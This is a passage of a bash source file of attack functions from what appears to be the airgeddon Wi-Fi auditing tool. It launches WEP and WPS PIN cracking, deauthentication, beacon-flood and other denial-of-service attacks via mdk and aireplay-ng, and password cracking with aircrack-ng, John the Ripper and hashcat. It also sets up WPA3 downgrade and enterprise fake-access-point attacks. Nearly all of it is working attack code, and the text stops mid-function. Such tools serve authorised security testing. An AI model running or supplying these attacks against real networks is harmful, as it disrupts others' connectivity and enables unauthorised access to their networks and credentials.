#!/usr/bin/env bash
# attacks.sh - Attack execution functions
# Auto-split from wfast.sh

function exec_wep_besside_attack() {

	debug_print

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"

	prepare_wep_attack "besside"

	recalculate_windows_sizes
	pushd "${tmpdir}" > /dev/null 2>&1
	manage_output "-hold -bg \"#000000\" -fg \"#FF00FF\" -geometry ${g2_stdleft_window} -T \"WEP Besside-ng attack\"" "besside-ng -c \"${channel}\" -b \"${bssid}\" \"${interface}\" -v | tee \"${tmpdir}${wep_besside_log}\"" "WEP Besside-ng attack" "active"
	wait_for_process "besside-ng -c \"${channel}\" -b \"${bssid//:/ }\" \"${interface}\" -v" "WEP Besside-ng attack"
	popd "${tmpdir}" > /dev/null 2>&1

	manage_wep_besside_pot
}
function exec_wep_allinone_attack() {

	debug_print

	echo
	language_strings "${language}" 296 "yellow"
	language_strings "${language}" 115 "read"

	prepare_wep_attack "allinone"
	set_wep_script

	recalculate_windows_sizes
	bash "${tmpdir}${wep_attack_file}" > /dev/null 2>&1 &
	wep_script_pid=$!

	set_wep_key_script
	bash "${tmpdir}${wep_key_handler}" "${wep_script_pid}" > /dev/null 2>&1 &
	wep_key_script_pid=$!

	echo
	language_strings "${language}" 434 "yellow"
	language_strings "${language}" 115 "read"

	kill_wep_windows
}
function kill_wep_windows() {

	debug_print

	kill "${wep_script_pid}" &> /dev/null
	wait $! 2> /dev/null

	kill "${wep_key_script_pid}" &> /dev/null
	wait $! 2> /dev/null

	readarray -t WEP_PROCESSES_TO_KILL < <(cat < "${tmpdir}${wepdir}${wep_processes_file}" 2> /dev/null)
	for item in "${WEP_PROCESSES_TO_KILL[@]}"; do
		kill "${item}" &> /dev/null
	done

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		kill_tmux_windows
	fi
}
function exec_wps_custom_pin_bully_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "bully" "custompin"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS custom pin bully attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin bully attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin bully attack"
}
function exec_wps_custom_pin_reaver_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "custompin"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS custom pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin reaver attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin reaver attack"
}
function exec_bully_pixiewps_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "bully" "pixiedust"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS bully pixie dust attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully pixie dust attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully pixie dust attack"
}
function exec_reaver_pixiewps_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "pixiedust"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS reaver pixie dust attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver pixie dust attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver pixie dust attack"
}
function exec_wps_bruteforce_pin_bully_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "bully" "bruteforce"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS bruteforce pin bully attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin bully attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin bully attack"
}
function exec_wps_bruteforce_pin_reaver_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "bruteforce"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS bruteforce pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin reaver attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin reaver attack"
}
function exec_wps_pin_database_bully_attack() {

	debug_print

	wps_pin_database_prerequisites

	set_wps_attack_script "bully" "pindb"

	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS bully known pins database based attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully known pins database based attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully known pins database based attack"
}
function exec_wps_pin_database_reaver_attack() {

	debug_print

	wps_pin_database_prerequisites

	set_wps_attack_script "reaver" "pindb"

	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS reaver known pins database based attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver known pins database based attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver known pins database based attack"
}
function exec_reaver_nullpin_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "nullpin"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS null pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS null pin reaver attack" "active"
	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS null pin reaver attack"
}
function launch_dos_pursuit_mode_attack() {

	debug_print

	rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
	rm -rf "${tmpdir}clts.csv" > /dev/null 2>&1
	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1

	if [[ -n "${2}" ]] && [[ "${2}" = "relaunch" ]]; then
		if [[ -z "${enterprise_mode}" ]] && [[ -z "${et_mode}" ]]; then
			echo
			language_strings "${language}" 707 "yellow"
		else
			echo
			language_strings "${language}" 507 "yellow"
		fi
	fi

	recalculate_windows_sizes
	case "${1}" in
		"${mdk_command} amok attack")
			dos_delay=1
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${interface}"
			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"aireplay deauth attack")
			dos_delay=3
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${interface}"
			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"auth dos attack")
			dos_delay=1
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${interface}"
			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"beacon flood attack")
			dos_delay=1
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${interface}"
			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} b -n '${essid}' -c ${channel} -s 1000 -h" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"wids / wips / wds confusion attack")
			dos_delay=10
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${interface}"
			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e '${essid}' -c ${channel}" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"michael shutdown attack")
			dos_delay=1
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${interface}"
			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024" "${1} (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"${mdk_command}")
			dos_delay=1
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" "Deauth (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"Aireplay")
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			dos_delay=3
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "Deauth (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
		"Auth DoS")
			dos_delay=10
			interface_pursuit_mode_scan="${secondary_wifi_interface}"
			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "Deauth (DoS Pursuit mode)"
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
				dos_pursuit_mode_attack_pid="${global_process_pid}"
				global_process_pid=""
			fi
		;;
	esac

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		dos_pursuit_mode_attack_pid=$!
	fi
	dos_pursuit_mode_pids+=("${dos_pursuit_mode_attack_pid}")

	if [ "${channel}" -gt 14 ]; then
		if [ "${interface_pursuit_mode_scan}" = "${interface}" ]; then
			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				echo
				language_strings "${language}" 515 "red"
				kill_dos_pursuit_mode_processes
				language_strings "${language}" 115 "read"
				return 1
			else
				airodump_band_modifier="abg"
			fi
		else
			if [ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				echo
				language_strings "${language}" 515 "red"
				kill_dos_pursuit_mode_processes
				language_strings "${language}" 115 "read"
				return 1
			else
				airodump_band_modifier="abg"
			fi
		fi
	else
		if [ "${interface_pursuit_mode_scan}" = "${interface}" ]; then
			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				airodump_band_modifier="bg"
			else
				airodump_band_modifier="abg"
			fi
		else
			if [ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				airodump_band_modifier="bg"
			else
				airodump_band_modifier="abg"
			fi
		fi
	fi

	sleep "${dos_delay}"
	airodump-ng -w "${tmpdir}dos_pm" "${interface_pursuit_mode_scan}" --band "${airodump_band_modifier}" > /dev/null 2>&1 &
	dos_pursuit_mode_scan_pid=$!
	dos_pursuit_mode_pids+=("${dos_pursuit_mode_scan_pid}")

	if [[ -n "${2}" ]] && [[ "${2}" = "relaunch" ]]; then
		if [[ -n "${enterprise_mode}" ]] || [[ -n "${et_mode}" ]]; then
			launch_fake_ap
		fi
	fi

	local processes_file
	processes_file="${tmpdir}${et_processesfile}"
	for item in "${dos_pursuit_mode_pids[@]}"; do
		echo "${item}" >> "${processes_file}"
	done
}
function exec_mdkdeauth() {

	debug_print

	echo
	language_strings "${language}" 89 "title"
	language_strings "${language}" 32 "green"

	rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
	echo "${bssid}" > "${tmpdir}bl.txt"

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "${mdk_command} amok attack" "first_time"
		pid_control_pursuit_mode "${mdk_command} amok attack"
	else
		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack" "active"
		wait_for_process "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
	fi
}
function exec_aireplaydeauth() {

	debug_print

	echo
	language_strings "${language}" 90 "title"
	language_strings "${language}" 32 "green"

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "aireplay deauth attack" "first_time"
		pid_control_pursuit_mode "aireplay deauth attack"
	else
		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack" "active"
		wait_for_process "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
	fi
}
function exec_wdsconfusion() {

	debug_print

	echo
	language_strings "${language}" 91 "title"
	language_strings "${language}" 32 "green"

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "wids / wips / wds confusion attack" "first_time"
		pid_control_pursuit_mode "wids / wips / wds confusion attack"
	else
		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e '${essid}' -c ${channel}" "wids / wips / wds confusion attack" "active"
		wait_for_process "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
	fi
}
function exec_beaconflood() {

	debug_print

	echo
	language_strings "${language}" 92 "title"
	language_strings "${language}" 32 "green"

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "beacon flood attack" "first_time"
		pid_control_pursuit_mode "beacon flood attack"
	else
		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"beacon flood attack\"" "${mdk_command} ${interface} b -n '${essid}' -c ${channel} -s 1000 -h" "beacon flood attack" "active"
		wait_for_process "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack"
	fi
}
function exec_authdos() {

	debug_print

	echo
	language_strings "${language}" 93 "title"
	language_strings "${language}" 32 "green"

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "auth dos attack" "first_time"
		pid_control_pursuit_mode "auth dos attack"
	else
		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack" "active"
		wait_for_process "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
	fi
}
function exec_michaelshutdown() {

	debug_print

	echo
	language_strings "${language}" 94 "title"
	language_strings "${language}" 32 "green"

	echo
	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 506 "yellow"
		language_strings "${language}" 4 "read"

		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
			dos_pursuit_mode_pids=()
		fi
		launch_dos_pursuit_mode_attack "michael shutdown attack" "first_time"
		pid_control_pursuit_mode "michael shutdown attack"
	else
		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
		language_strings "${language}" 33 "yellow"
		language_strings "${language}" 4 "read"
		recalculate_windows_sizes
		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"michael shutdown attack\"" "${mdk_command} ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack" "active"
		wait_for_process "${mdk_command} ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack"
	fi
}
function exec_aircrack_bruteforce_attack() {

	debug_print
	rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
	aircrack_cmd="crunch \"${minlength}\" \"${maxlength}\" \"${charset}\" | aircrack-ng -a 2 -b \"${bssid}\" -l \"${tmpdir}${aircrack_pot_tmp}\" -w - \"${enteredpath}\" ${colorize}"
	eval "${aircrack_cmd}"
	language_strings "${language}" 115 "read"
}
function exec_aircrack_dictionary_attack() {

	debug_print

	rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
	aircrack_cmd="aircrack-ng -a 2 -b \"${bssid}\" -l \"${tmpdir}${aircrack_pot_tmp}\" -w \"${DICTIONARY}\" \"${enteredpath}\" ${colorize}"
	eval "${aircrack_cmd}"
	language_strings "${language}" 115 "read"
}
function exec_jtr_dictionary_attack() {

	debug_print

	rm -rf "${tmpdir}jtrtmp"* > /dev/null 2>&1

	jtr_cmd="john \"${jtrenterpriseenteredpath}\" --format=netntlm-naive --wordlist=\"${DICTIONARY}\" --pot=\"${tmpdir}${jtr_pot_tmp}\" --encoding=UTF-8 | tee \"${tmpdir}${jtr_output_file}\" ${colorize}"
	eval "${jtr_cmd}"
	language_strings "${language}" 115 "read"
}
function exec_jtr_bruteforce_attack() {

	debug_print

	rm -rf "${tmpdir}jtrtmp"* > /dev/null 2>&1

	jtr_cmd="crunch \"${minlength}\" \"${maxlength}\" \"${charset}\" | john \"${jtrenterpriseenteredpath}\" --stdin --format=netntlm-naive --pot=\"${tmpdir}${jtr_pot_tmp}\" --encoding=UTF-8 | tee \"${tmpdir}${jtr_output_file}\" ${colorize}"
	eval "${jtr_cmd}"
	language_strings "${language}" 115 "read"
}
function exec_hashcat_dictionary_attack() {

	debug_print

	if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	else
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m ${hashcat_enterprise_cracking_plugin} -a 0 \"${hashcatenterpriseenteredpath}\" \"${DICTIONARY}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	fi
	eval "${hashcat_cmd}"
	language_strings "${language}" 115 "read"
}
function exec_hashcat_bruteforce_attack() {

	debug_print

	if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 3 \"${tmpdir}${hashcat_tmp_file}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 3 \"${tmpdir}${hashcat_tmp_file}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	else
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m ${hashcat_enterprise_cracking_plugin} -a 3 \"${hashcatenterpriseenteredpath}\" ${charset} --increment --increment-min=${minlength} --increment-max=${maxlength} --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	fi
	eval "${hashcat_cmd}"
	language_strings "${language}" 115 "read"
}
function exec_hashcat_rulebased_attack() {

	debug_print

	if [ "${1}" = "personal_handshake_pmkid_capture" ]; then
		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	elif [ "${1}" = "personal_handshake_pmkid_hash" ]; then
		hashcat_cmd="hashcat -m ${hashcat_handshake_cracking_plugin} -a 0 \"${tmpdir}${hashcat_tmp_file}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	else
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		hashcat_cmd="hashcat -m ${hashcat_enterprise_cracking_plugin} -a 0 \"${hashcatenterpriseenteredpath}\" \"${DICTIONARY}\" -r \"${RULES}\" --potfile-disable -o \"${tmpdir}${hashcat_pot_tmp}\"${hashcat_cmd_fix} | tee \"${tmpdir}${hashcat_output_file}\" ${colorize}"
	fi
	eval "${hashcat_cmd}"
	language_strings "${language}" 115 "read"
}
function exec_wpa3_downgrade_attack() {

	debug_print

	set_hostapd_mana_config
	launch_fake_mana_ap
	exec_wpa3_downgrade_deauth
	check_mana_hashes
	kill_wpa3_downgrade_attack_processes
	restore_wpa3_downgrade_interface
	manage_mana_pot
	clean_tmpfiles
}
function exec_enterprise_attack() {

	debug_print

	rm -rf "${tmpdir}${control_enterprise_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
	mkdir "${tmpdir}${enterprisedir}" > /dev/null 2>&1

	set_hostapd_wpe_config
	launch_fake_ap
	exec_et_deauth
	set_enterprise_control_script
	launch_enterprise_control_window
	write_et_processes

	echo
	language_strings "${language}" 524 "yellow"
	language_strings "${language}" 115 "read"

	kill_et_windows

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		recover_current_channel
	fi

	if [ "${enterprise_mode}" = "noisy" ]; then
		restore_et_interface
	else
		if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
			if [ -f "${tmpdir}${enterprisedir}returning_vars.txt" ]; then

				local tmp_interface
				tmp_interface=$(grep -E "^interface=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
				if [ -n "${tmp_interface}" ]; then
					interface="${tmp_interface}"
				fi

				local tmp_phy_interface
				tmp_phy_interface=$(grep -E "^phy_interface=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
				if [ -n "${tmp_phy_interface}" ]; then
					phy_interface="${tmp_phy_interface}"
				fi

				local tmp_current_iface_on_messages
				tmp_current_iface_on_messages=$(grep -E "^current_iface_on_messages=" "${tmpdir}${enterprisedir}returning_vars.txt" 2> /dev/null | awk -F "=" '{print $2}')
				if [ -n "${tmp_current_iface_on_messages}" ]; then
